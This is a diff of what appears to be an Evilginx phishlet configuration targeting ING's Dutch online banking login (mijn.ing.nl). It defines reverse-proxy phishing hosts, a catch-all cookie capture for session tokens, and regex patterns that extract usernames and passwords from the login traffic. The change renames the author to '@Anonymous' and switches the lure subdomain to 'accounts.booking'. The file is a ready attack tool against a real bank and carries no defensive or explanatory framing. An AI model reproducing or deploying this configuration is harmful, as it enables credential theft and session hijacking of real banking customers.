@@ -1,32 +1,20 @@
-author: '@hash3liZer'
+author: '@Anonymous'
 min_ver: '2.3.0'
-
 proxy_hosts:
- - {phish_sub: 'www', orig_sub: 'mijn', domain: 'ing.nl', session: true, is_landing: true, auto_filter: false}
-
-
-sub_filters:
- - {triggers_on: 'mijn.ing.nl', orig_sub: 'mijn', domain: 'ing.nl', search: 'mijn.ing.nl', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-
-
+  - {phish_sub: 'accounts.booking'       , orig_sub: 'mijn'       , domain: 'ing.nl', session: false, is_landing: true}
+sub_filters: []
 auth_tokens:
- - domain: 'mijn.ing.nl'
-   keys: ['.*,regexp']
- 
-
+  - domain: '.ing.nl'
+    keys: ['bkng','.*,regexp']
 credentials:
- username:
-  key: ''
-  search: '"username":"([^"]*)'
-  type: 'json'
- password:
-  key: ''
-  search: '"password":"([^"]*)'
-  type: 'json'
-
-auth_urls:
- - '/asdasdsa/somerandom/'
-
+  username:
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'    
 login:
- domain: 'mijn.ing.nl'
- path: '/login'
+    domain: 'mijn.ing.nl'
+    path: '/login'
